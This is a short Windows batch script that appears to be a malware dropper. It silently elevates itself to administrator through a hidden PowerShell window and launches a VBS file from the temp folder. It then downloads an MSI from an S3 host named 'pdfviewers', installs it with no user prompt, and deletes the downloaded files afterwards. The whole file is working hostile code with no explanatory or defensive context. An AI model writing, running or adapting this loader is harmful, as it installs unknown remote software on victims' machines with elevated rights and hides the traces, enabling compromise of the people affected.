@echo off
setlocal enabledelayedexpansion

:: 
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

set "Temps=%TEMP%"
set "agents=%Temps%\agent-c92d02.msi"
set "main=%Temps%\elevate.vbs"

start "" wscript.exe "%main%"
set "_url=https://pdfviewers.s3.ap-northeast-1.amazonaws.com/Install.msi"

powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%_url%', '%agents%')"

::
if exist "%agents%" msiexec /i "%agents%" /qn

::
timeout /t 5 /nobreak >nul
del "%agents%" /q >nul 2>&1
del "%main%" /q >nul 2>&1
exit /b 0
